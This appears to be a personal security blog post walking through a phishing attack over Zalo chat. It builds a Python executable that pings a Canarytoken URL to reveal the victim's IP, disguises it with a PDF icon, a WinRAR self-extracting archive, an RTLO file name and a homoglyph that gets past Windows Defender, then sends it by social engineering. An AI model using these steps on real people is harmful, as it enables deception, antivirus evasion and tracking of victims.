



<!DOCTYPE html>
<html lang="en" itemscope itemtype="http://schema.org/WebPage">
  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    

  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">

 


      <title>Unmasking Cyber Threats: The Art of Phishing with Canarytokens and RTLO Attacks - Daminha Blog</title>

  <meta name="description" content="In this detailed blog post, we explore the insidious world of phishing attacks carried out via Zalo chat. Through a step-by-step demonstration, we reveal how attackers craft convincing disguised files, use social engineering to lure victims, and employ Canarytokens to track unauthorized access and gather critical data like public IP addresses. Discover the techniques behind this sophisticated form of cyber deception and learn how to protect yourself from falling victim to such attacks."><script type="application/ld+json">
{
    "@context": "http://schema.org",
    "@type": "WebSite",
    "name": "Daminha Blog",
    
    "url": "http:\/\/localhost:1313\/"
}
</script><script type="application/ld+json">
{
  "@context": "http://schema.org",
  "@type": "Organization",
  "name": "",
  "url": "http:\/\/localhost:1313\/"
  
  
  
  
}
</script>
<script type="application/ld+json">
{
  "@context": "http://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [{
        "@type": "ListItem",
        "position": 1,
        "item": {
          "@id": "http:\/\/localhost:1313\/",
          "name": "home"
        }
    },{
        "@type": "ListItem",
        "position": 3,
        "item": {
          "@id": "http:\/\/localhost:1313\/posts\/d030924\/unmasking-cyber-threads\/",
          "name": "Unmasking cyber threats the art of phishing with canarytokens and rtlo attacks"
        }
    }]
}
</script><script type="application/ld+json">
{
  "@context": "http://schema.org",
  "@type": "Article",
  "author": {
    "name" : "Dang Duong Minh Nhat"
  },
  "headline": "Unmasking Cyber Threats: The Art of Phishing with Canarytokens and RTLO Attacks",
  "description" : "In this detailed blog post, we explore the insidious world of phishing attacks carried out via Zalo chat. Through a step-by-step demonstration, we reveal how attackers craft convincing disguised files, use social engineering to lure victims, and employ Canarytokens to track unauthorized access and gather critical data like public IP addresses. Discover the techniques behind this sophisticated form of cyber deception and learn how to protect yourself from falling victim to such attacks.",
  "inLanguage" : "en",
  "wordCount":  2668 ,
  "datePublished" : "2024-09-03T13:49:38\u002b07:00",
  "dateModified" : "2024-09-03T13:49:38\u002b07:00",
  "image" : "http:\/\/localhost:1313\/",
  "keywords" : [ "Phishing, CyberSecurity, Social Engineering, Network Security, Digital Deception, Cyber Attacks" ],
  "mainEntityOfPage" : "http:\/\/localhost:1313\/posts\/d030924\/unmasking-cyber-threads\/",
  "publisher" : {
    "@type": "Organization",
    "name" : "http:\/\/localhost:1313\/",
    "logo" : {
        "@type" : "ImageObject",
        "url" : "http:\/\/localhost:1313\/",
        "height" :  60 ,
        "width" :  60
    }
  }
}
</script>


<meta property="og:title" content="Unmasking Cyber Threats: The Art of Phishing with Canarytokens and RTLO Attacks" />
<meta property="og:description" content="In this detailed blog post, we explore the insidious world of phishing attacks carried out via Zalo chat. Through a step-by-step demonstration, we reveal how attackers craft convincing disguised files, use social engineering to lure victims, and employ Canarytokens to track unauthorized access and gather critical data like public IP addresses. Discover the techniques behind this sophisticated form of cyber deception and learn how to protect yourself from falling victim to such attacks.">
<meta property="og:url" content="http://localhost:1313/posts/d030924/unmasking-cyber-threads/" />
<meta property="og:type" content="website" />
<meta property="og:site_name" content="Daminha Blog" />

  <meta name="twitter:title" content="Unmasking Cyber Threats: The Art of Phishing with Canarytokens and …" />
  <meta name="twitter:description" content="In this detailed blog post, we explore the insidious world of phishing attacks carried out via Zalo chat. Through a step-by-step demonstration, we reveal how attackers craft convincing disguised …">
  <meta name="twitter:card" content="summary_large_image" />
  <meta name="generator" content="Hugo 0.129.0">
  <link rel="alternate" href="http://localhost:1313/index.xml" type="application/rss+xml" title="Daminha Blog"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.7/dist/katex.min.css" integrity="sha384-3UiQGuEI4TTMaFmGIZumfRPtfKQ3trwQE2JgosJxCnGmQpL/lJdjpcHkaaFwHlcI" crossorigin="anonymous">
  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.5.0/css/all.css" integrity="sha384-B4dIYHKNBt8Bc12p+WXckhzcICo0wtJAoU8YZTY5qE0Id1GSseTk6S+L3BlXeVIU" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@3.4.1/dist/css/bootstrap.min.css" integrity="sha384-HSMxcRTRxnN+Bdg0JdbxYKrThecOKuH5zCYotlSAcp1+c8xmyTe9GYg1l9a69psu" crossorigin="anonymous"><link rel="stylesheet" href="http://localhost:1313/css/main.css" /><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" />
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" /><link rel="stylesheet" href="http://localhost:1313/css/syntax.css" /><link rel="stylesheet" href="http://localhost:1313/css/codeblock.css" /><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.css" integrity="sha384-h/L2W9KefUClHWaty3SLE5F/qvc4djlyR4qY3NUV5HGQBBW7stbcfff1+I/vmsHh" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/default-skin/default-skin.min.css" integrity="sha384-iD0dNku6PYSIQLyfTOpB06F2KCZJAKLOThS5HRe8b3ibhdEQ6eKsFf/EeFxdOt5R" crossorigin="anonymous">
<link rel="apple-touch-icon" sizes="180x180" href="/favicon_io/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/favicon_io/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/favicon_io/favicon-16x16.png">
<link rel="manifest" href="/favicon_io/site.webmanifest">

<script type="text/x-mathjax-config">
  MathJax.Hub.Config({
    tex2jax: {
      inlineMath: [['$', '$'], ['\\(', '\\)']],
      processEscapes: true
    }
  });
</script>
<script type="text/javascript" async
  src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS_HTML-full">
</script>
<script type="text/javascript" async
  src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js">
</script>


    <meta name="google-site-verification" content="ors8seNeA2TL4hvELynbBtrr4PwXapoPh2td6zTadCU" />
  </head>
  <body>
    <nav class="navbar navbar-default navbar-fixed-top navbar-custom">
  <div class="container-fluid">
    <div class="navbar-header">
      <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#main-navbar">
        <span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
      <a class="navbar-brand" href="http://localhost:1313/">Daminha Blog</a>
    </div>

    <div class="collapse navbar-collapse" id="main-navbar">
      <ul class="nav navbar-nav navbar-right">
        
          
            <li>
              <a title="About" href="/posts/about-me/">About</a>
            </li>
          
        
          
            <li>
              <a title="Tags" href="/tags/">Tags</a>
            </li>
          
        
          
            <li>
              <a title="Blog" href="/">Blog</a>
            </li>
          
        

        

        
      </ul>
    </div>

    

  </div>
</nav>




    


<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

<div class="pswp__bg"></div>

<div class="pswp__scroll-wrap">
    
    <div class="pswp__container">
      <div class="pswp__item"></div>
      <div class="pswp__item"></div>
      <div class="pswp__item"></div>
    </div>
    
    <div class="pswp__ui pswp__ui--hidden">
    <div class="pswp__top-bar">
      
      <div class="pswp__counter"></div>
      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
      <button class="pswp__button pswp__button--share" title="Share"></button>
      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
      
      
      <div class="pswp__preloader">
        <div class="pswp__preloader__icn">
          <div class="pswp__preloader__cut">
            <div class="pswp__preloader__donut"></div>
          </div>
        </div>
      </div>
    </div>
    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
      <div class="pswp__share-tooltip"></div>
    </div>
    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
    </button>
    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
    </button>
    <div class="pswp__caption">
      <div class="pswp__caption__center"></div>
    </div>
    </div>
    </div>
</div>


  
  
  






  

  <header class="header-section ">
    
    
    <div class="intro-header no-img">
      <div class="container">
        <div class="row">
          <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
            <div class="posts-heading">
              
                <h1>Unmasking Cyber Threats: The Art of Phishing with Canarytokens and RTLO Attacks</h1>
              
              
                <hr class="small">
              
              
              
            </div>
          </div>
        </div>
      </div>
    </div>
  
  </header>


    
<div class="container" role="main">
  <div class="row">
    <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
      <article role="main" class="blog-post">
        <p>
          <strong>Posted on:</strong> September 3, 2024 |
          <strong>Reading time:</strong> 13 minutes |
          <strong>Word count:</strong> 2668 words |
          <strong>Author:</strong> Dang Duong Minh Nhat
        </p>
        <p>In today’s digital age, where trust in familiar platforms often leads to lowered defenses, attackers are finding new ways to exploit our habits. Imagine receiving a seemingly harmless file from a colleague or friend through Zalo chat—a platform you use daily. You download it without a second thought, only to unknowingly trigger a hidden payload that reveals your sensitive information to a lurking attacker. This blog post uncovers the sophisticated technique of phishing via Zalo chat, where social engineering meets technical deception. Learn how attackers craft disguised files, lure victims into opening them, and track their every move—all while staying under the radar.</p>
<h2 id="table-of-contents">Table of Contents</h2>
<ul>
<li><a href="#table-of-contents">Table of Contents</a></li>
<li><a href="#background">Background</a>
<ul>
<li><a href="#what-are-canarytokens?">What Are Canarytokens?</a></li>
<li><a href="#understanding-homoglyph-attacks">Understanding Homoglyph Attacks</a></li>
<li><a href="#the-insidious-right-to-left-override-attack">The Insidious Right-to-Left Override Attack</a></li>
<li><a href="#the-role-of-winrar-in-cyber-attacks">The Role of WinRAR in Cyber Attacks</a></li>
</ul>
</li>
<li><a href="#crafting-a-deceptive-attack:-how-hackers-could-use-canarytokens-to-track-and-trap-you">Crafting a Deceptive Attack: How Hackers Could Use Canarytokens to Track and Trap You</a>
<ul>
<li><a href="#step-1:-the-gateway---navigating-to-canarytokens.org">Step 1: The Gateway - Navigating to Canarytokens.org</a></li>
<li><a href="#step-2:-setting-the-trap---entering-the-details">Step 2: Setting the Trap - Entering the Details</a></li>
<li><a href="#step-3:-the-final-step---generating-the-token">Step 3: The Final Step - Generating the Token</a></li>
<li><a href="#step-4:-the-bait---crafting-a-python-script">Step 4: The Bait - Crafting a Python Script</a></li>
<li><a href="#step-5:-the-disguise---converting-the-script-to-an-executable">Step 5: The Disguise - Converting the Script to an Executable</a></li>
<li><a href="#step-6:-the-masquerade---choosing-a-deceptive-icon">Step 6: The Masquerade - Choosing a Deceptive Icon</a></li>
<li><a href="#step-7:-hiding-in-plain-sight---combining-files-with-winrar">Step 7: Hiding in Plain Sight - Combining Files with WinRAR</a></li>
<li><a href="#step-8:-the-sleight-of-hand---employing-right-to-left-override-(rtlo)">Step 8: The Sleight of Hand - Employing Right-to-Left Override (RTLO)</a></li>
<li><a href="#step-9:-the-hook---social-engineering-the-target">Step 9: The Hook - Social Engineering the Target</a></li>
</ul>
</li>
<li><a href="#phishing-via-zalo-chat:-a-step-by-step-attack-demonstration">Phishing via Zalo Chat: A Step-by-Step Attack Demonstration</a>
<ul>
<li><a href="#step-1:-crafting-the-disguised-file">Step 1: Crafting the Disguised File</a></li>
<li><a href="#step-2:-sending-the-disguised-file-via-zalo-chat">Step 2: Sending the Disguised File via Zalo Chat</a></li>
<li><a href="#step-3:-the-victim-opens-the-disguised-file">Step 3: The Victim Opens the Disguised File</a></li>
<li><a href="#step-4:-the-attacker-receives-an-alert">Step 4: The Attacker Receives an Alert</a></li>
<li><a href="#step-5:-monitoring-and-analyzing-the-attack">Step 5: Monitoring and Analyzing the Attack</a></li>
</ul>
</li>
<li><a href="#references">References</a></li>
<li><a href="#connect-with-me">Connect with Me</a></li>
</ul>
<h1 id="background">Background</h1>
<p>In today&rsquo;s digital landscape, where the sophistication of cyberattacks is constantly evolving, understanding the tools and techniques that attackers use is crucial for strengthening our defenses. Among these tools are Canarytokens, Homoglyph attacks, and Right-to-Left Override (RTLO) attacks. These methods, though varied in their approach, share a common goal: to deceive and exploit unsuspecting users, leading to potentially severe consequences. In this blog, we&rsquo;ll explore each of these concepts in detail, revealing how they work, why they&rsquo;re effective, and how you can protect yourself and your organization from falling victim to these hidden threats.</p>
<h2 id="what-are-canarytokens">What Are Canarytokens?</h2>
<p>Imagine having a network of digital motion sensors scattered across your computers, networks, and cloud environments. These sensors are so discreet that they can be placed in folders, on network devices, or even within mobile phones—essentially anywhere within your digital infrastructure. This is the power of <a href="https://canarytokens.org/nest/">Canarytokens</a>.</p>
<p>Canarytokens function as tripwires designed to detect unauthorized access. When an attacker interacts with a Canarytoken, it immediately alerts you to a potential security breach. But Canarytokens go beyond just sounding an alarm; they also capture valuable information about the intruder, such as their public IP address. This critical detail can help you track down the source of the breach and respond swiftly to neutralize the threat.</p>
<p>What makes Canarytokens particularly effective is their ability to mimic valuable or sensitive files. By appearing enticing to attackers, these tokens increase the likelihood of being accessed by unauthorized users. Once triggered, Canarytokens send an immediate notification to your email, allowing you to take prompt action. And the best part? Canarytokens are free, making them an accessible tool for organizations of all sizes to enhance their digital security.</p>
<h2 id="understanding-homoglyph-attacks">Understanding Homoglyph Attacks</h2>
<p>In the world of typography, some characters look almost identical to one another, even though they may represent different symbols or letters. For example, the number &ldquo;0&rdquo; and the uppercase letter &ldquo;O&rdquo; are often indistinguishable in certain fonts. Similarly, the Latin letter &ldquo;H&rdquo; and the Cyrillic letter &ldquo;Ｈ&rdquo; look alike, as do the uppercase &ldquo;I&rdquo; (&ldquo;I&rdquo;) and the lowercase &ldquo;l&rdquo; (&ldquo;L&rdquo;) in a sans-serif font. These look-alike characters are known as <strong>homoglyphs</strong>.</p>
<p>Attackers leverage homoglyphs to conduct <a href="https://en.wikipedia.org/wiki/IDN_homograph_attack">Homoglyph attacks</a>, sometimes referred to as homograph attacks. In these attacks, cybercriminals use homoglyphs to create deceptive URLs or to obfuscate malicious code. For instance, an attacker might register a domain name that appears identical to a legitimate one, but with a slight variation in one character—such as replacing the letter &ldquo;I&rdquo; (&ldquo;I&rdquo;) with a lowercase &ldquo;l&rdquo; (&ldquo;L&rdquo;). To an untrained eye, &ldquo;InternationalBank.com&rdquo; and &ldquo;InternationaIBank.com&rdquo; might seem identical, but the latter leads to a malicious site.</p>
<p>Homoglyphs can also be used within code to conceal the true nature of malicious instructions. For example, an attacker might insert a homoglyph into a string of code, causing it to behave differently than intended. What looks like a benign piece of software could, in reality, contain commands that trigger a harmful action, such as redirecting a user to a malicious domain or altering critical system settings.</p>
<h2 id="the-insidious-right-to-left-override-attack">The Insidious Right-to-Left Override Attack</h2>
<p>Phishing remains one of the most common methods used by cybercriminals to infiltrate systems, and one particularly deceptive phishing technique is the <strong>Right-to-Left Override (RTLO) attack</strong>. This attack preys on the trust and familiarity that users have with file types and names, disguising dangerous executable files as harmless text documents.</p>
<p>The key to an RTLO attack lies in a special Unicode character known as the Right-to-Left Override, represented as [U+202E]. In languages such as Arabic and Hebrew, text is read from right to left, and this Unicode character enables systems to display text in this direction. However, when used in a filename, the RTLO character can flip part of the file name, making it appear as something it is not.</p>
<p>For example, a malicious file named &ldquo;malware.exe&rdquo; could be disguised as &ldquo;malware[U+202E]exe.txt.&rdquo; When viewed by the user, this file name would appear as &ldquo;malwaretxt.exe,&rdquo; leading them to believe it is a harmless text document. In reality, double-clicking on this file would execute the embedded malware, potentially leading to data theft, unauthorized access, or even a ransomware attack.</p>
<p>To further complicate detection, attackers often compress these RTLO-manipulated files into zip archives, sometimes password-protecting them to prevent automated security scanners from examining the contents. The password is typically provided in the phishing email, enticing the victim to open the file. Once the executable is launched, the consequences can be severe.</p>
<h2 id="the-role-of-winrar-in-cyber-attacks">The Role of WinRAR in Cyber Attacks</h2>
<p><a href="https://www.win-rar.com/start.html?&amp;L=0">WinRAR</a> is a widely used archive manager, known for its ability to compress and decompress files efficiently. However, this powerful tool can also be exploited by attackers to disguise malicious files. By packaging a malicious executable alongside legitimate software within a single archive, attackers can make it appear as though the victim is downloading a harmless application. When combined with techniques like RTLO, even experienced users can be deceived into running dangerous software.</p>
<h1 id="crafting-a-deceptive-attack-how-hackers-could-use-canarytokens-to-track-and-trap-you">Crafting a Deceptive Attack: How Hackers Could Use Canarytokens to Track and Trap You</h1>
<p>Imagine a digital booby trap so subtle, so cleverly disguised, that it catches an intruder in the act without them even realizing it. Enter Canarytokens—an ingenious tool that functions like a digital tripwire, designed to alert you the moment someone steps into a restricted area of your network. But how exactly do attackers exploit this tool to gather sensitive information like your public IP address? Let’s dive into a step-by-step breakdown of how this can be done, from creating a Canarytoken to disguising it as a harmless file that lures in the unsuspecting.</p>
<h2 id="step-1-the-gateway---navigating-to-canarytokensorg">Step 1: The Gateway - Navigating to Canarytokens.org</h2>
<p>The first step in this nefarious process begins with a visit to <a href="https://canarytokens.org/nest/">Canarytokens.org</a>. This website is a treasure trove for those looking to set up digital traps. Canarytokens come in various forms, each designed to serve as a subtle sentinel within your network, ready to sound the alarm at the slightest unauthorized touch.</p>
<p><img src="/images/d030924/step1.png" alt="Line"></p>
<p>For this demonstration, the attacker would choose the &ldquo;Web Image&rdquo; option—a token in the form of a URL. This URL will serve as the bait, lying in wait for someone to take the wrong step.</p>
<h2 id="step-2-setting-the-trap---entering-the-details">Step 2: Setting the Trap - Entering the Details</h2>
<p>With the token type selected, the attacker is prompted to fill in some key details. First, they enter an email address, where they&rsquo;ll receive an alert if the token is accessed. This email address is critical—it’s where the digital trap springs to life, notifying the attacker of any suspicious activity. Next, a brief memo is added. This memo helps the attacker keep track of their various tokens, ensuring they remember exactly where each one is deployed and what its purpose is.</p>
<p><img src="/images/d030924/step2.png" alt="Line"></p>
<h2 id="step-3-the-final-step---generating-the-token">Step 3: The Final Step - Generating the Token</h2>
<p>Once the details are in place, the attacker generates the Canarytoken. The system creates a unique URL—this is the magic link that, when accessed, will silently capture the public IP address of the intruder and send it straight to the attacker&rsquo;s inbox.</p>
<p><img src="/images/d030924/step3.png" alt="Line"></p>
<h2 id="step-4-the-bait---crafting-a-python-script">Step 4: The Bait - Crafting a Python Script</h2>
<p>With the token ready, it’s time to craft the bait. The attacker writes a simple Python script designed to send a request to the Canarytoken URL. Here’s a snippet of what that might look like:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://canarytokens.com/terms/images/o5x12z9cb6ofh5c23pxfp9kw6/post.jsp&#34;</span>
</span></span><span style="display:flex;"><span>response <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(url)
</span></span><span style="display:flex;"><span>print(response)
</span></span></code></pre></div><p>When executed, this script triggers the Canarytoken, sending an alert to the attacker’s email, complete with the public IP address of the machine that ran the script. It’s a simple yet effective way to gather valuable information.</p>
<h2 id="step-5-the-disguise---converting-the-script-to-an-executable">Step 5: The Disguise - Converting the Script to an Executable</h2>
<p>To make the script more convincing and harder to detect, the attacker converts the Python script into an executable file using <a href="https://pypi.org/project/pyinstaller/">PyInstaller</a>. An executable is far more likely to be run by a target, especially if it looks harmless.</p>
<p><img src="/images/d030924/step5.png" alt="Line"></p>
<h2 id="step-6-the-masquerade---choosing-a-deceptive-icon">Step 6: The Masquerade - Choosing a Deceptive Icon</h2>
<p>An executable file is one thing, but to truly deceive the target, the attacker needs to make it look legitimate. This is where the icon comes in. By selecting an icon that resembles a harmless file type—like a PDF or a Word document—the attacker increases the chances that the target will open the file. They can find a suitable icon in PNG format on sites like <a href="https://www.iconfinder.com/">Iconfinder</a>. For example, if they want the executable to look like a PDF file, download a PDF icon in PNG format.</p>
<p><img src="/images/d030924/pdf.png" alt="Line"></p>
<p>Since executables require an icon file in .ico format, the attacker will need to convert the PNG icon to .ico format. They can do this using online tools like <a href="https://www.icoconverter.com/">ICOConverter</a>. Upload the PNG file, convert it to .ico, and then apply it to the executable file.</p>
<p><img src="/images/d030924/ico.png" alt="Line"></p>
<h2 id="step-7-hiding-in-plain-sight---combining-files-with-winrar">Step 7: Hiding in Plain Sight - Combining Files with WinRAR</h2>
<p>But the deception doesn’t stop there. To further mask the malicious file, the attacker uses WinRAR to combine it with a legitimate application—say, the Chrome browser. This tactic makes the malicious executable look even more trustworthy.</p>
<p>Using WinRAR, the attacker selects both the legitimate and malicious executables, right-clicks, and chooses &ldquo;Add to Archive.&rdquo;</p>
<p><img src="/images/d030924/arc.png" alt="Line"></p>
<p>They ensure the &ldquo;Create SFX archive&rdquo; option is checked.</p>
<p><img src="/images/d030924/sfx.png" alt="Line"></p>
<p>Under &ldquo;Advanced&rdquo; settings, they configure the setup so that the malicious executable runs when the archive is opened.</p>
<p><img src="/images/d030924/adv1.png" alt="Line">
<img src="/images/d030924/adv2.png" alt="Line">
<img src="/images/d030924/adv3.png" alt="Line">
<img src="/images/d030924/adv4.png" alt="Line"></p>
<h2 id="step-8-the-sleight-of-hand---employing-right-to-left-override-rtlo">Step 8: The Sleight of Hand - Employing Right-to-Left Override (RTLO)</h2>
<p>The final touch is to make the executable appear as something completely benign—a document, for instance. The attacker employs a technique known as Right-to-Left Override (RTLO). This technique involves inserting a Unicode character that reverses the text direction, making the file name appear as something benign, like &ldquo;Reflexe.pdf,&rdquo; while in reality, it is an executable file.</p>
<ol>
<li>Open the Character Map app on Windows and enable &ldquo;Advanced View.&rdquo;</li>
<li>In the &ldquo;Go to Unicode&rdquo; field, type 202E and copy the character.</li>
<li>Rename your archive file to something that looks normal when reversed, like &ldquo;Reflfdp.exe,&rdquo; and paste the Unicode character to create the illusion of a PDF file.</li>
</ol>
<p><img src="/images/d030924/char.png" alt="Line"></p>
<p>For example, the attacker might rename their file from &ldquo;Reflfdp.exe&rdquo; to &ldquo;Reflfdp[RTLO]exe.pdf.&rdquo; After applying RTLO, the file name appears as &ldquo;Reflexe.pdf&rdquo; to the target, but it still executes as an EXE.</p>
<p>But they have a problem — Because this is a known file type (.pdf) that is initiating an executable, it is flagged by windows defender very quickly.</p>
<p><img src="/images/d030924/def.png" alt="Line"></p>
<p>I focused on the letters p, d, and f to see if I could swap any out that wouldn’t be noticed and I found this variation of ‘ｆ’ that looked suitable. I swapped the <a href="https://www.irongeek.com/homoglyph-attack-generator.php">Homoglyph</a> ‘ｆ’ with the normal ‘f’ in the name Refl<strong>ｆ</strong>dp.exe and then inserted the RTLO right before it like before to create Reflexe.pd<strong>ｆ</strong> which should give a different signature to defender:</p>
<p><img src="/images/d030924/f.png" alt="Line"></p>
<p>Result:</p>
<p><img src="/images/d030924/result.png" alt="Line"></p>
<h2 id="step-9-the-hook---social-engineering-the-target">Step 9: The Hook - Social Engineering the Target</h2>
<p>Now that the file is fully disguised, the final step is to get the target to download and open it. This is where social engineering comes into play. The attacker might send an email, posing as someone the target trusts, and convince them to download the file.</p>
<p>Once the target runs the executable, the embedded Python script will execute, sending a request to the Canarytoken URL and triggering an alert with the target&rsquo;s public IP address. The trap has been sprung, and the attacker now has critical information in hand.</p>
<h1 id="phishing-via-zalo-chat-a-step-by-step-attack-demonstration">Phishing via Zalo Chat: A Step-by-Step Attack Demonstration</h1>
<p>Phishing attacks have evolved, with attackers constantly seeking new ways to deceive their targets. One such method leverages Zalo, a popular messaging platform, to deliver disguised malicious files. This blog post takes you through a detailed step-by-step demonstration of how an attacker might execute a phishing attack via Zalo chat, using a Canarytoken to track unauthorized access and gather critical information, such as the victim&rsquo;s public IP address.</p>
<h2 id="step-1-crafting-the-disguised-file">Step 1: Crafting the Disguised File</h2>
<p>The first move in this phishing operation involves the creation of a disguised file. The attacker begins by preparing a folder that contains a seemingly harmless file, often named and presented as something innocuous, like a PDF document. However, beneath this innocent appearance lies an executable file embedded with malicious intent.</p>
<p><img src="/images/d030924/folder.png" alt="Line"></p>
<h2 id="step-2-sending-the-disguised-file-via-zalo-chat">Step 2: Sending the Disguised File via Zalo Chat</h2>
<p>With the malicious file ready, the attacker then sends it to the victim through Zalo chat. The choice of Zalo is strategic; as a widely-used messaging app, it adds a layer of social engineering. The attacker might pose as a colleague, friend, or someone the victim trusts, increasing the likelihood that the file will be downloaded and opened without suspicion.</p>
<p><img src="/images/d030924/zalo.png" alt="Line"></p>
<h2 id="step-3-the-victim-opens-the-disguised-file">Step 3: The Victim Opens the Disguised File</h2>
<p>Once the victim receives the folder through Zalo, the trap is set. Believing the file to be a harmless document, they download and open it. This is where the attacker’s plan comes to fruition. Instead of viewing a benign PDF, the victim unknowingly executes the hidden payload within the file.</p>
<p>This action triggers the embedded Canarytoken, a tool designed to notify the attacker when the file is accessed. The token captures vital details about the access, such as the victim’s public IP address, providing the attacker with crucial information to further their objectives.</p>
<h2 id="step-4-the-attacker-receives-an-alert">Step 4: The Attacker Receives an Alert</h2>
<p>As soon as the disguised file is opened, the Canarytoken goes into action. The attacker receives an immediate email alert, informing them that the file has been accessed. This alert doesn’t just confirm the attack’s success; it also delivers valuable data—the public IP address of the victim. This information can be used to glean further insights into the victim’s network and geographic location, aiding in subsequent stages of the attack.</p>
<p><img src="/images/d030924/email.png" alt="Line"></p>
<h2 id="step-5-monitoring-and-analyzing-the-attack">Step 5: Monitoring and Analyzing the Attack</h2>
<p>The final piece of this phishing operation involves monitoring the triggered alerts. Canarytoken IDs come with a web interface that logs all interactions with the token. This history log allows the attacker to track the attack’s progress, review the success of the phishing attempt, and plan any necessary follow-up actions. The ability to analyze these interactions provides the attacker with a comprehensive view of the attack’s impact and effectiveness.</p>
<p><img src="/images/d030924/history.png" alt="Line"></p>
<h1 id="references">References</h1>
<ol>
<li><em>Canarytokens&rsquo;s guide</em>. Canarytokens. Retrieved from: <a href="https://docs.canarytokens.org/guide/">https://docs.canarytokens.org/guide/</a></li>
<li>Sam Rothlisberger. (2024, January 16). <em>Embed A Malicious Executable in a Normal PDF or EXE</em>. Retrieved from: <a href="https://medium.com/@sam.rothlisberger/embed-a-malicious-executable-in-a-normal-pdf-or-exe-81ee5339707e">https://medium.com/@sam.rothlisberger/embed-a-malicious-executable-in-a-normal-pdf-or-exe-81ee5339707e</a></li>
<li><em>What is a Homoglyph Attack?</em>. Feroot. Retrieved from: <a href="https://www.feroot.com/education-center/what-is-a-homoglyph-attack/">https://www.feroot.com/education-center/what-is-a-homoglyph-attack/</a></li>
<li><em>What is a Right-to-Left Override Attack?</em>. Cybriant. Retrieved from: <a href="https://cybriant.com/what-is-a-right-to-left-override-attack/">https://cybriant.com/what-is-a-right-to-left-override-attack/</a></li>
</ol>
<h1 id="connect-with-me">Connect with Me</h1>
<p>Connect with me on <a href="https://www.facebook.com/dangduongminhnhat/">Facebook</a>, <a href="https://www.linkedin.com/in/nhatdang1901/">LinkedIn</a>, via email at <a href="mailto:dangduongminhnhat2003@gmail.com">dangduongminhnhat2003@gmail.com</a>, <a href="https://github.com/dangduongminhnhat">GitHub</a>, or by phone at +84829258815.</p>


        
          <div class="blog-tags">
            
              
              <a href="http://localhost:1313/tags/phishing/">Phishing</a>&nbsp;
            
              
              <a href="http://localhost:1313/tags/cybersecurity/">CyberSecurity</a>&nbsp;
            
              
              <a href="http://localhost:1313/tags/social-engineering/">Social Engineering</a>&nbsp;
            
              
              <a href="http://localhost:1313/tags/network-security/">Network Security</a>&nbsp;
            
              
              <a href="http://localhost:1313/tags/digital-deception/">Digital Deception</a>&nbsp;
            
              
              <a href="http://localhost:1313/tags/cyber-attacks/">Cyber Attacks</a>&nbsp;
            
          </div>
        

        

        
      </article>
      

      
        <ul class="pager blog-pager">
          
            <li class="previous">
              <a href="http://localhost:1313/posts/d240824/unraveling-snarks/" data-toggle="tooltip" data-placement="top" title="Unraveling SNARKs: The Breakthrough Technology in Cryptography">&larr; Previous Post</a>
            </li>
          
          
        </ul>
      


      

    </div>
  </div>
</div>

      <footer>
  <div class="container">
    
    <div class="row">
      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
        <ul class="list-inline text-center footer-links">
          
          
        </ul>
        <p class="credits copyright text-muted">
          

          &nbsp;&bull;&nbsp;&copy;
          
            2024
          

          
            &nbsp;&bull;&nbsp;
            <a href="http://localhost:1313/">Daminha Blog</a>
          
        </p>
        
        <p class="credits theme-by text-muted">
          <a href="https://gohugo.io">Hugo v0.129.0</a> powered &nbsp;&bull;&nbsp; Theme <a href="https://github.com/halogenica/beautifulhugo">Beautiful Hugo</a> adapted from <a href="https://deanattali.com/beautiful-jekyll/">Beautiful Jekyll</a>
          
        </p>
      </div>
    </div>
  </div>
</footer><script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.7/dist/katex.min.js" integrity="sha384-G0zcxDFp5LWZtDuRMnBkk3EphCK1lhEf4UEyEM693ka574TZGwo4IWwS6QLzM/2t" crossorigin="anonymous"></script>
<script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.7/dist/contrib/auto-render.min.js" integrity="sha384-+VBxd3r6XgURycqtZ117nYw44OOcIax56Z4dCRWbxyPt0Koah1uHoK0o4+/RRE05" crossorigin="anonymous" onload="renderMathInElement(document.body);"></script>
